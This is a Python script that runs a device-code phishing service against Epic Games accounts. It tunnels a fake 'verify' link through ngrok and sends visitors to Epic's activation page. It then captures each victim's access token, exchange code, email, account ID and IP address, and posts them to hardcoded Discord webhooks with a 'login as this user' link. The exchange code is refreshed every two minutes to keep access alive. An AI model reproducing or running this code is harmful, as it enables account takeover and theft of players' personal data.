#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Standalone Webhook Script, based on the original working code.
This version removes all bot-related functionality and uses updated webhooks.
- Last Updated: 2025-11-13 22:27:30
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform
import time

def run_setup():
    """Ensures all dependencies and ngrok are installed before starting."""
    print("--- Starting initial setup ---")
    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("1/2: Downloading and installing ngrok...")
            machine, system = platform.machine().lower(), platform.system().lower()
            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
            
            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
            os.remove("ngrok.zip")
            os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("1/2: ngrok is already installed.")

    authtoken = os.getenv("NGROK_AUTHTOKEN")
    if authtoken:
        try:
            print("2/2: Configuring ngrok authtoken...")
            subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("     ngrok authtoken configured.")
        except Exception as e:
            print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
    else:
        print("2/2: NGROK_AUTHTOKEN not set, skipping configuration.")
    print("--- Setup complete ---")

# Run the setup first thing.
run_setup()

# --- MAIN APPLICATION IMPORTS ---
import logging
import asyncio
import threading
from datetime import datetime
import http.server
import socketserver
import uuid
import traceback
import aiohttp

# ==============================================================================
# --- CONFIGURATION AND GLOBALS ---
# ==============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("webhook_runner")

# --- WEBHOOK-SPECIFIC CONFIG (UPDATED) ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645878176092220/RAweu24YWlY1ljU9a0wNa774B8a4ig00SCI42J1yM0xpu0eUY4dHJsCVUsnzDdh5-cNB"
DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645950959583375/KTdPTjVBrdYH9P5QMzlZnPT4xlIKmM6IvcOD_zQFjUILZb-C7M4VDL213-sAKxjFqJ9j"
REFRESH_INTERVAL = 120

# --- SHARED GLOBALS ---
ngrok_ready = threading.Event()
permanent_link = None
permanent_link_id = None
verification_uses = 0
active_sessions = {}
session_lock = threading.Lock()
main_event_loop = asyncio.new_event_loop()

# ==============================================================================
# --- EPIC AUTHENTICATION WEBHOOK LOGIC ---
# ==============================================================================
async def create_epic_auth_session():
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    async with aiohttp.ClientSession() as sess:
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
            r.raise_for_status()
            token_data = await r.json()
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
            r.raise_for_status()
            dev_auth = await r.json()
    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}

async def refresh_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
                return (await r.json())['code'] if r.status == 200 else None
    except Exception as e:
        logger.error(f"❌ Error refreshing exchange code: {e}"); return None

async def auto_refresh_session(session_id, access_token, account_info, user_ip):
    display_name = account_info.get('displayName', 'Unknown')
    logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}")
    refresh_count = 0
    try:
        while True:
            await asyncio.sleep(REFRESH_INTERVAL)
            new_exchange_code = await refresh_exchange_code(access_token)
            if new_exchange_code:
                refresh_count += 1
                with session_lock:
                    if session_id in active_sessions:
                        active_sessions[session_id].update({'exchange_code': new_exchange_code, 'last_refresh': time.time(), 'refresh_count': refresh_count})
                    else:
                        logger.info(f"[{session_id}] ⏹️ Session removed; stopping auto-refresh for {display_name}"); break
                logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{refresh_count})")
                await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
            else:
                logger.error(f"[{session_id}] ❌ Failed to refresh exchange code for {display_name}. Removing session.")
                break
    except asyncio.CancelledError:
        logger.info(f"[{session_id}] ⏹️ Auto-refresh task cancelled for {display_name}")
    finally:
        with session_lock: active_sessions.pop(session_id, None)
        logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}")

def monitor_epic_auth_sync(verify_id, device_code, interval, expires_in, user_ip):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip))
    finally:
        loop.close()

async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip):
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    logger.info(f"[{verify_id}] 👁️  Monitoring Epic auth...")
    try:
        async with aiohttp.ClientSession() as sess:
            deadline = time.time() + expires_in
            while time.time() < deadline:
                await asyncio.sleep(interval)
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "device_code": device_code}) as r:
                    if r.status != 200: continue
                    token_resp = await r.json()
                    if "access_token" in token_resp:
                        logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2: exchange_data = await r2.json()
                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3: account_info = await r3.json()
                        
                        session_id = str(uuid.uuid4())[:8]
                        with session_lock:
                            active_sessions[session_id] = {'access_token': token_resp['access_token'], 'exchange_code': exchange_data['code'], 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0}
                        
                        asyncio.run_coroutine_threadsafe(send_login_success(session_id, account_info, exchange_data['code'], user_ip), main_event_loop)
                        asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip), main_event_loop)
                        return
    except Exception as e:
        logger.error(f"[{verify_id}] ❌ Monitoring error: {e}\n{traceback.format_exc()}")

async def send_webhook_message(webhook_url, payload):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=payload) as resp:
                if not (200 <= resp.status < 300):
                    logger.warning(f"Webhook send failed with status {resp.status}: {await resp.text()}")
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")

async def send_login_success(session_id, account_info, exchange_code, user_ip):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "✅ User Logged In Successfully", "description": f"**{display_name}** has completed verification!\n\n🔄 *Exchange code will auto-refresh every 2 minutes in the updates channel*", "color": 3066993, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Link uses: {verification_uses} | Auto-refresh: ON | Updates will be sent to muted channel"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_WEBHOOK_URL, {"embeds": [embed]})

async def send_refresh_update(session_id, account_info, exchange_code, user_ip, refresh_count):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "🔄 Exchange Code Refreshed", "description": f"**{display_name}** - New exchange code generated!", "color": 3447003, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Refresh #{refresh_count} | Refreshed at {datetime.utcnow().strftime('%H:%M:%S UTC')}"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_UPDATES_WEBHOOK_URL, {"embeds": [embed]})

def send_webhook_startup_message(link):
    embed = {"title": "🚀 Epic Auth System Started", "description": f"System is online and ready!\n\n🔗 **Permanent Verification Link:**\n`{link}`\n\n🔄 Exchange codes will auto-refresh every 2 minutes\n📢 Updates will be sent to the muted channel", "color": 3447003}
    requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})

# ==============================================================================
# --- WEB SERVER & NGROK ---
# ==============================================================================
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        if self.path.startswith('/verify/'):
            if not permanent_link_id or self.path.split('/')[-1] != permanent_link_id: return self.send_error(404, "Link not found")
            verification_uses += 1
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            logger.info(f"\n[{permanent_link_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")
            try:
                loop = asyncio.new_event_loop()
                epic_session = loop.run_until_complete(create_epic_auth_session())
                loop.close()
                threading.Thread(target=monitor_epic_auth_sync, args=(permanent_link_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip), daemon=True).start()
                self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
            except Exception as e:
                logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
        else: self.send_error(404)
    def log_message(self, format, *args): pass

def run_web_server(port):
    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
        logger.info(f"🚀 Web server starting on port {port}"); httpd.serve_forever()

def setup_ngrok_tunnel(port):
    global permanent_link, permanent_link_id
    ngrok_executable = os.path.join(os.getcwd(), "ngrok")
    try:
        logger.info("🌐 Starting ngrok...")
        # REMOVED custom domain to work on free tier. ngrok will generate a random URL.
        subprocess.Popen([ngrok_executable, 'http', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Give ngrok time to start its API
        time.sleep(3) 

        for i in range(12): # Try for 60 seconds
            try:
                with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5) as r:
                    r.raise_for_status()
                    for tunnel in r.json().get('tunnels', []):
                        if (public_url := tunnel.get('public_url', '')).startswith('https'):
                            permanent_link_id = str(uuid.uuid4())[:12]
                            permanent_link = f"{public_url}/verify/{permanent_link_id}"
                            logger.info(f"✅ Ngrok live: {public_url}\n🔗 Permanent link: {permanent_link}")
                            ngrok_ready.set()
                            send_webhook_startup_message(permanent_link)
                            return
            except requests.ConnectionError:
                logger.warning(f"ngrok API not ready, retrying... (Attempt {i+1}/12)")
                time.sleep(5) # Wait before retrying
                continue
        logger.critical("❌ Ngrok failed to start or create a tunnel in 60 seconds."); sys.exit(1)
    except Exception as e: logger.critical(f"❌ Ngrok error: {e}"); sys.exit(1)

# ==============================================================================
# --- MAIN EXECUTION ---
# ==============================================================================
def run_main_loop():
    asyncio.set_event_loop(main_event_loop)
    main_event_loop.run_forever()

def start_app():
    logger.info("=" * 60 + "\n🚀 STANDALONE WEBHOOK SYSTEM STARTING\n" + "=" * 60)
    
    # Start background threads for the web server and the ngrok tunnel setup
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()

    # Wait for ngrok to signal that it's ready
    if not ngrok_ready.wait(timeout=65):
        logger.critical("❌ Timed out waiting for ngrok to initialize. Exiting."); return
    
    logger.info("=" * 60 + f"\n✅ WEBHOOK READY | Link: {permanent_link}\n" + "=" * 60)
    
    # Start the main async event loop after ngrok is ready
    run_main_loop()

if __name__ == "__main__":
    start_app()
